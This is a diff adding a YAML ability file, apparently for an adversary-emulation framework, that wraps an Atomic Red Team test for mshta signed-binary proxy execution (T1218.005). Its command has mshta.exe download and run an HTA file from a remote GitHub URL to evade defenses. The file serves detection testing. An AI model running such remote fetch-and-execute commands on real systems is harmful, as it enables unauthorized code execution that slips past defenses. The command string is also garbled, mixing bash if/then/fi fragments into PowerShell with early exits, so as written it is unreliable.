@@ -1,0 +1,51 @@
+- id: 39ceed55-f653-48ac-bd19-aceceaf525db
+  name: Invoke HTML Application - Direct download from URI
+  description: Executes an HTA Application by directly downloading from remote URI.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.005
+    name: 'Signed Binary Proxy Execution: Mshta'
+  platforms:
+    windows:
+      psh:
+        command: '$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable;
+          if (-not $RequiredModule) {exit 1}; if (-not $RequiredModule.ExportedCommands[''Invoke-ATHHTMLApplication''])
+          {exit 1} else {exit 0}; then : ; else Install-Module -Name AtomicTestHarnesses
+          -Scope CurrentUser -Force; fi; Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+          -MSHTAFilePath $env:windir\system32\mshta.exe'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1218.005
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      mshta_file_path:
+        description: Location of mshta.exe
+        type: string
+        default: $env:windir\system32\mshta.exe
+      hta_uri:
+        description: URI to HTA
+        type: url
+        default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta
+    dependencies:
+    - description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication
+        must be exported in the module.
+      prereq_command: '$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+
+        if (-not $RequiredModule) {exit 1}
+
+        if (-not $RequiredModule.ExportedCommands[''Invoke-ATHHTMLApplication''])
+        {exit 1} else {exit 0}'
+      get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+        -Force
+
+        '
+    technique_created: '2020-01-23T19:32:49.557Z'
+    atomic_guid: 39ceed55-f653-48ac-bd19-aceceaf525db
+    import_timestamp: '2025-06-24T11:15:00.874318Z'
